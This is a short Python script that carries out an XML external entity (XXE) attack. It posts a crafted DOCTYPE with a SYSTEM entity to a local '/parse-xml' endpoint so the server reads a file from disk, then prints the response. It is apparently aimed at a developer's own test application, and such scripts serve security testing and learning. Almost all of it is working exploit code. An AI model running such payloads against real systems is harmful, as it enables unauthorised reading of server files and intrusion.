import requests

# Craft a malicious XML payload with an external entity
payload = '''
<!DOCTYPE root [
    <!ENTITY salut SYSTEM "file:///home/anis/Projects/danger-dev/danger4.py">
]>
<root>&salut;</root>
'''

# Make a POST request to the vulnerable endpoint
response = requests.post("http://localhost:5000/parse-xml", data=payload)

# Extract the response content
content = response.text

# Print the content (assuming it contains the parsed XML)
print(content)
